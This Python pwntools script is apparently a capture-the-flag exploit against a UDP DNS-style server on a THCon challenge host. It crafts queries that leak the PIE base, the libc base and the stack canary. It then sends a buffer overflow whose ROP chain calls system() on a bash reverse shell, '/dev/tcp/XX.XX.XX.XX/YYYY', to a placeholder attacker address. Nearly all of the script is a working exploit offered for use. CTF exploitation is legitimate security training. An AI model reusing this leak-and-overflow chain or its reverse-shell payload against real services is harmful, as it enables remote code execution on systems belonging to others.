#!/usr/bin/python3

from pwn import *
from random import randint

elf = ELF('../dist/server')
libc = ELF('../dist/libc.so.6')

REMOTE = True
DEBUG = not REMOTE

context.arch = 'amd64'
context.terminal = ['gnome-terminal', '--title=GDB-Pwn', '-e']

def getPIEBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

if REMOTE:
    r = remote('challenges1.thcon.party', 531, typ='udp')
else:
    r = remote('127.0.0.1', 5653, typ='udp')

def craft_query(domain, data=b''):
    parts = domain.split(b".")
    tid = randint(0, 0x10000)
    flags = 0x100

    buf = b""
    buf += p16(tid, endian="big")
    buf += p16(flags, endian="big")
    buf += p16(0x1, endian="big")
    buf += p16(0) * 3
    for p in parts:
        buf += p8(len(p) & 0xff)
        buf += p
    buf += p8(0)
    buf += p16(0x10, endian="big")
    buf += p16(0x1, endian="big")

    # "data" is used to place additional data that will not be
    # parsed by the server, this allows us for example to have
    # controlled data over bss

    if len(data) > 0:
        buf = buf.ljust(64, b"\x00")
        buf += data

    return buf

def parse_answer(answer):
    return answer.split(b"\xc0\x0c")[1][11:]

def encrypt(buffer, key):
    encrypted = []
    for i in range(len(buffer)):
        encrypted.append(buffer[i] ^ key)
        key = encrypted[i]
    return bytes(bytearray(encrypted)).hex()

def decrypt(buffer, key):
    buffer = bytearray(key.to_bytes(1, 'big') + bytes.fromhex(buffer.decode()))

    for i in range(0, len(buffer) - 1)[::-1]:
        buffer[i+1] ^= buffer[i]

    return buffer[1:]

session = b'2636-00-d519'
key = int(session.split(b"-")[1], 16)

log.success(f'Session: {session.decode()}')
log.success(f'Key: {hex(key)}')

log.info('Leaking PIE with __dso_handle pointer')

leak_pie_query = craft_query(session + b".-1.command.thcon.party")
r.send(leak_pie_query)

code_base = u64(decrypt(parse_answer(r.recv()), key).ljust(8, b'\x00')) - 0x5008

log.success(f'PIE Leak: {hex(code_base)}')

log.info('Leaking libc via GOT entries')

leak_libc_query = craft_query(session + b".21.command.thcon.party", data=p64(code_base + elf.got['malloc']))
r.send(leak_libc_query)

libc_base = u64(decrypt(parse_answer(r.recv()), key).ljust(8, b'\x00')) - libc.sym['malloc']

log.success(f'libc base is @ {hex(libc_base)}')

log.info('Leaking canary via fs_base')

canary_leak_query = craft_query(session + b".21.command.thcon.party", data=p64(libc_base + 0x1f35a8 + 1))
r.send(canary_leak_query)

canary = u64(decrypt(parse_answer(r.recv()), key)[:7].rjust(8, b'\x00'))

log.success(f'stack canary: {hex(canary)}')

log.info('Executing reverse shell via buffer overflow')

pop_rdi = code_base + 0x0000000000002973 #Â pop rdi ; ret

command = b"bash -c 'bash -i &>/dev/tcp/XX.XX.XX.XX/YYYY <&1'\x00"

buf = b'B'*60
buf += p64(canary)
buf += p64(0)
buf += p64(pop_rdi + 1)
buf += p64(pop_rdi)
buf += p64(code_base + 0x51b8)
buf += p64(libc_base + libc.sym['system'])

buf = encrypt(buf, key).encode()
malsess = (session + b'-').ljust(0x40, b'\x41')
overflow = craft_query(buf + b"." + malsess + b".data.thcon.party", data=b"\x00"*4 + command)

r.send(overflow)

log.success('Enjoy your shell :)')

r.interactive()
